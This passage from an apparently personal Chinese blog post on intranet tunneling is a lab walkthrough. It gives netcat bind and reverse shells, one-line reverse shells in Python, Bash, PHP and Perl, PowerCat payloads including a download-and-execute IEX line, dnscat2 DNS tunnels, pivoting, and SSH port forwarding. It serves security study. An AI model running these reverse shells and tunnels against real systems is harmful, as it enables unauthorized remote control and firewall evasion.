+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> 目标主机的<span class="hljs-built_in">IP</span> 以及监听的端口<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/19.png" srcset="/img/loading.gif" alt="image-20210211110934505"></p>
+<p>可以看到在执行ifconfig的结果已经是拿到目标的shell了。</p>
+<h4 id="2-反向shell"><a href="#2-反向shell" class="headerlink" title="2.反向shell"></a>2.反向shell</h4><p>反向shell通常用在开启了防护措施的目标机器上，例如防火墙过滤、端口转发等。</p>
+<p>目标主机执行如下命令：（此时目标主机为客户端，攻击者为服务端）</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc VPSip 端口 -e <span class="hljs-regexp">/bin/</span>sh <span class="hljs-regexp">//</span>linux<br>nc VPSip 端口 -e c:\windows\system32\cmd.exe <span class="hljs-regexp">//</span>windows<br></code></pre></td></tr></table></figure>
+<p>本地或vps上执行如下命令：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> -lvp 要监听的端口<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/20.png" srcset="/img/loading.gif" alt="image-20210211140557906"></p>
+<h4 id="3-在目标主机中没有nc时，获取反向shell"><a href="#3-在目标主机中没有nc时，获取反向shell" class="headerlink" title="3.在目标主机中没有nc时，获取反向shell"></a>3.在目标主机中没有nc时，获取反向shell</h4><p><strong>1.python反向shel</strong></p>
+<p>目标主机执行如下命令：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.56.1&quot;,2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;],&quot;-i&quot;);&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+<p><strong>2.Bash反向shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/VPSip/port 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+<p><strong>3.PHP反向shell</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;VPSip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><strong>4.Perl反向shell</strong></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;VPSIP&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;)&#125;;open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure>
+<h3 id="3-内网代理"><a href="#3-内网代理" class="headerlink" title="3.内网代理"></a>3.内网代理</h3><p>测试场景：</p>
+<p>攻击者VPS—-&gt;172.16.56.1；一个小型的内网;两台机器，假设已经获取到了web服务器（linux，ip—-&gt;172.16.56.129,172.16.55.128）的权限，通过攻击者的VPS不能直接访问数据库服务器（linux，ip—-&gt;172.16.55.132），但通过web服务器可以访问数据库服务器。</p>
+<p>测试目标：获取数据库服务器的shell。</p>
+<p>VPS执行：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/21.png" srcset="/img/loading.gif"></p>
+<p>数据库服务器执行：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvp <span class="hljs-number">3333</span> -e <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/22.png" srcset="/img/loading.gif"></p>
+<p>最后web服务器执行：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -v <span class="hljs-number">172.16.56.1</span> <span class="hljs-number">6666</span> -c <span class="hljs-string">&quot;nc -v 172.16.55.132 3333&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/23.png" srcset="/img/loading.gif"></p>
+<p>拿到172.16.55.132的shell</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/24.png" srcset="/img/loading.gif"></p>
+<h2 id="3-PowerCat"><a href="#3-PowerCat" class="headerlink" title="3.PowerCat"></a>3.PowerCat</h2><p>​    powercat可以说是nc的powercat版本。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat.git">https://github.com/besimorhino/powercat.git</a></p>
+<p>​    <strong>在powershell命令行中，要想使用该脚本（powercat.ps1），必须先进行导入操作。</strong></p>
+<p>​    输入命令”<code>Import-Module .\powercat.ps1</code>“，但是导入的时候可能会出现异常（权限不足的异常），直接修改权限为<code>RemoteSigned</code></p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/25.png" srcset="/img/loading.gif"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-ExecutionPolicy <span class="hljs-comment">RemoteSigned</span> <br>然后输入y即可<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/26.png" srcset="/img/loading.gif"></p>
+<h3 id="1-操作"><a href="#1-操作" class="headerlink" title="1.操作"></a>1.操作</h3><p>假设环境：攻击者VPS（deepin）172.16.56.1，还有一个小型内网：两台机器，一台windows 7 <code>172.16.56.131</code>，<code>172.16.55.133</code>，另一台是windows 2008 r2 —-&gt;<code>172.16.55.131</code></p>
+<h4 id="1-通过nc正向连接PowerCat"><a href="#1-通过nc正向连接PowerCat" class="headerlink" title="1.通过nc正向连接PowerCat"></a>1.通过nc正向连接PowerCat</h4><p>在windows 7 服务器上执行监听命令</p>
+<p>“<code>powercat -l -p 9090 -e cmd.exe -v</code>“</p>
+<p>然后在攻击者vps上执行</p>
+<p><code>netcat 172.16.56.131 9090 -vv</code></p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/27.png" srcset="/img/loading.gif"></p>
+<h4 id="2-通过nc反响连接PowerCat"><a href="#2-通过nc反响连接PowerCat" class="headerlink" title="2.通过nc反响连接PowerCat"></a>2.通过nc反响连接PowerCat</h4><p>在攻击者机器上执行</p>
+<p><code>netcat -l -p 4444 -vv</code></p>
+<p>在windows 7执行如下命令，-c参数用于提供想要连接的IP地址。</p>
+<p><code>powercat -c 172.16.56.1 -p 4444 -v -e cmd.exe</code></p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/28.png" srcset="/img/loading.gif"></p>
+<h4 id="3-通过powercat返回powershell"><a href="#3-通过powercat返回powershell" class="headerlink" title="3.通过powercat返回powershell"></a>3.通过powercat返回powershell</h4><p>如果想返回powershell，则无法与nc进行交互。下面介绍如何让windows 7 和 windows 2008 r2 建立方向连接。（win7得到win2008 shell）</p>
+<p>在windows server 2008执行如下命令：从远程服务器上下载<code>powercat.ps1</code>文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">IEX</span> (New-Object Net.WebClient).DownloadString(&#x27;https://<span class="hljs-number">172.16.55.1</span>/powercat.ps<span class="hljs-number">1</span>&#x27;)<br><br><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">172.16.55.133</span> -p <span class="hljs-number">9999</span> -v -ep<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/31.png" srcset="/img/loading.gif"></p>
+<p>在windows 7中执行如下命令，-ep参数用于返回powershell：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -l -p <span class="hljs-number">9999</span> -v<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/30.png" srcset="/img/loading.gif"></p>
+<h4 id="4-使用powercat生成payload"><a href="#4-使用powercat生成payload" class="headerlink" title="4.使用powercat生成payload"></a>4.使用powercat生成payload</h4><p>​    用powercat生成的payload也有正向和反向之分，并且可以对它进行编码。</p>
+<p><strong>正向shell</strong></p>
+<p>​    生成一个简单的payload，在windows 7 执行如下命令：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">powercat -l -p <span class="hljs-number">8000</span> -e <span class="hljs-keyword">cmd</span><span class="bash"> -v -g &gt;&gt; shell.ps1</span><br></code></pre></td></tr></table></figure>
+<p>​    将生成的ps1文件上传到目标机器上windows 2008中并执行</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">.\<span class="hljs-selector-tag">shell</span><span class="hljs-selector-class">.ps1</span><br></code></pre></td></tr></table></figure>
+<p>​    然后在windows 7执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">172.16.55.131</span>(windows<span class="hljs-number">2008</span> ip) -p <span class="hljs-number">8000</span> -v <br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/32.png" srcset="/img/loading.gif"></p>
+<p><strong>反弹powershell</strong></p>
+<p>windows 7生成如下shell.ps1，然后上传到windows 2008</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -l -p <span class="hljs-number">8000</span> -ep -v -g &gt;&gt; shell.ps<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>windows2008执行该ps1脚本</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">.\<span class="hljs-selector-tag">shell</span><span class="hljs-selector-class">.ps1</span><br></code></pre></td></tr></table></figure>
+<p>在windows 7执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">172.16.55.131</span> -p <span class="hljs-number">8000</span> -v <br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/33.png" srcset="/img/loading.gif"></p>
+<p><strong>生成编码后的反向shell</strong></p>
+<p>在windows 7 下执行如下命令即可得到经过编码的payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">172.16.55.133</span> -p <span class="hljs-number">9999</span> -ep -ge<br><span class="hljs-attribute">powercat</span> -l -p <span class="hljs-number">9999</span> -v 开启监听<br></code></pre></td></tr></table></figure>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">g：生成payload</span><br><span class="ruby">-ge：生成经过编码的payload，可以直接使用<span class="hljs-string">&quot;powercat -e &lt;编码&gt;&quot;</span> 命令。</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/34.png" srcset="/img/loading.gif"></p>
+<p>然后在windows 2008 执行</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/35.png" srcset="/img/loading.gif"></p>
+<p>但是我执行的时候会报错：</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/36.png" srcset="/img/loading.gif"></p>
+<p>虽然powercat的作者说在powershell2.0以上的版本就可以使用这个功能，但是根据测试，好像在powershell4.0以下都会报错。</p>
+<h4 id="5-powercat-dns隧道通信"><a href="#5-powercat-dns隧道通信" class="headerlink" title="5.powercat dns隧道通信"></a>5.powercat dns隧道通信</h4><p>powercat也是一套基于DNS通信的协议。</p>
+<p>powercat的DNS的通信是基于dnscat设计的（其服务端都是dnscat）。在使用dnscat之前，需要依次执行如下命令进行下载和编译：</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">cd dnscat2/server<br>gem <span class="hljs-keyword">install</span> bundler //也可以用apt-get <span class="hljs-keyword">install</span> bundler进行安装<br>bundler <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure>
+<p>然后在安装了dnscat2的vps或者主机上执行如下命令：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">ruby</span> dnscat2.rb ttpowercat.test -<span class="hljs-keyword">e</span> <span class="hljs-keyword">open</span> --<span class="hljs-keyword">no</span>-cache<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/37.png" srcset="/img/loading.gif"></p>
+<p>执行以上命令后，在windows 7主机上执行如下命令，本来应该在dnscat上可以看到反弹shell的，但是我一直没成功。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">powercat -c <span class="hljs-number">172.16</span><span class="hljs-number">.56</span><span class="hljs-number">.1</span>(vps <span class="hljs-built_in">ip</span>) -p <span class="hljs-number">53</span> -dns ttpowercat<span class="hljs-number">.</span><span class="hljs-keyword">test</span> -e cmd<span class="hljs-number">.</span>exe<br></code></pre></td></tr></table></figure>
+<p>后来用<code>firewall-cmd</code>命令开启了53端口，同时允许udp和tcp协议通过，才成功：</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/38.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/39.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/40.png" srcset="/img/loading.gif"></p>
+<h4 id="6-将powercat作为跳板"><a href="#6-将powercat作为跳板" class="headerlink" title="6.将powercat作为跳板"></a>6.将powercat作为跳板</h4><p>测试环境：三台主机，windows 7(<code>172.16.56.133</code>，<code>172.16.55.135</code>)主机可以通过ping 命令访问windows 2008(<code>172.16.55.137</code>)和攻击者的vps（deepin <code>172.16.56.1</code>），但是攻击者的主机无法和windows 2008 进行任何的网络连接。</p>
+<p>测试目标：将windows  7 作为跳板，让攻击者能够连上windows 2008。</p>
+<p>首先在windows 2008执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -l -v -p <span class="hljs-number">9999</span> -e cmd.exe<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/42.png" srcset="/img/loading.gif"></p>
+<p>然后在windows 7 执行如下命令：将流量转发给window 2008</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">powercat</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-p</span> 8000 <span class="hljs-selector-tag">-r</span> <span class="hljs-selector-tag">tcp</span><span class="hljs-selector-pseudo">:172.16.55.137</span><span class="hljs-selector-pseudo">:9999</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/43.png" srcset="/img/loading.gif"></p>
+<p>最后攻击者主机上执行如下命令，与windows 7连接，进而访问window 2008。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">172.16.56.133</span> <span class="hljs-number">8000</span> -v<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/41.png" srcset="/img/loading.gif"></p>
+<p><strong>也可以使用NDS协议进行通信</strong></p>
+<p>在windows 7 执行如下命令：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">powercat -l -p <span class="hljs-number">8000</span> -r <span class="hljs-symbol">dns:</span><span class="hljs-number">172.16</span>.<span class="hljs-number">55.137</span>(deepin ip)<span class="hljs-symbol">:</span><span class="hljs-symbol">:reader-l</span>.top<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/44.png" srcset="/img/loading.gif"></p>
+<p>在攻击者的vps执行如下命令：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ruby</span> dnscat2.rb reader-<span class="hljs-keyword">l</span>.top -<span class="hljs-keyword">e</span> <span class="hljs-keyword">open</span> --<span class="hljs-keyword">no</span>-cache<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/45.png" srcset="/img/loading.gif"></p>
+<p>在window 2008执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">172.16.55.135</span>(window <span class="hljs-number">7</span>) -p <span class="hljs-number">8000</span> -v -e cmd.exe<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/46.png" srcset="/img/loading.gif"></p>
+<p>即可拿到windows 2008的shell了。</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/47.png" srcset="/img/loading.gif"></p>
+<h1 id="5-应用层隧道技术"><a href="#5-应用层隧道技术" class="headerlink" title="5.应用层隧道技术"></a>5.应用层隧道技术</h1><p>应用层的隧道通信技术主要是利用应用软件提供的端口来发送数据。常用的隧道协议有SSH、HTTP/HTTPS和DNS。</p>
+<h2 id="1-SSH协议"><a href="#1-SSH协议" class="headerlink" title="1.SSH协议"></a>1.SSH协议</h2><p>​    在内网中，几乎所有的linux/unix服务器和网络设备都支持SSH协议。<strong>在一般情况下，SSH协议都是被允许通过防火墙和边界设备的</strong>(你懂的)。同时，SSH协议传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。</p>
+<p>​    基本的SSH命令：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">172.16.55.1</span><br></code></pre></td></tr></table></figure>
+<p>创建SSH隧道的常用的参数说明：</p>
+<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-literal">-C：压缩传输，提高传输效率</span><br><span class="hljs-literal">-f：将SSH传输转入后台执行，不占用当前的SHell</span><br><span class="hljs-literal">-N：建立静默连接（看不到具体会话）</span><br><span class="hljs-literal">-g：允许远程主机连接本地用于转发的端口</span><br><span class="hljs-literal">-L：本地端口转发</span><br><span class="hljs-literal">-R：远程端口转发</span><br><span class="hljs-literal">-D：动态转发</span><br><span class="hljs-literal">-P：指定SSH端口</span><br></code></pre></td></tr></table></figure>
+<h3 id="1-本地转发"><a href="#1-本地转发" class="headerlink" title="1.本地转发"></a>1.本地转发</h3><p><strong>本地端口转发则是在本地（客户机）监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口。</strong></p>
+<p>测试环境：一个攻击者的VPS，一个小型内网：两台主机，攻击者可以访问到kali linux（172.16.55.128 ，172.16.56.129），但是无法访问windows 2008（172.16.55.139）这个机器；内网可以互相访问。</p>
+<p>PS：注意要让SSH能用root身份连接登陆的话，需要修改<code>/etc/ssh/sshd_config</code></p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/48.png" srcset="/img/loading.gif"></p>
+<p>测试目标：将windows 2008的3389端口映射到VPS上6666端口，再访问VPS的6666端口就可以访问window 2008的3389端口了。</p>
+<p>在VPS机器上执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -CfNg -L <span class="hljs-number">6666</span>:<span class="hljs-number">172.16.55.139</span>(windows<span class="hljs-number">2008</span> ip):<span class="hljs-number">3389</span> root@<span class="hljs-number">172.16.56.129</span>(linux 跳板机器，vps可以访问的)<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/49.png" srcset="/img/loading.gif"></p>
+<p>访问VPS的3389端口，如下图：</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/50.png" srcset="/img/loading.gif"></p>
+<p><strong>SSH进程的本地端口映射可以将本地（客户机）的某个端口转发到远端的指定机器的指定端口；</strong></p>
+<p>该方法可以将攻击者的电脑的某个端口映射到VPS机器上，可以用来完成某一些操作。</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/59.png" srcset="/img/loading.gif"></p>
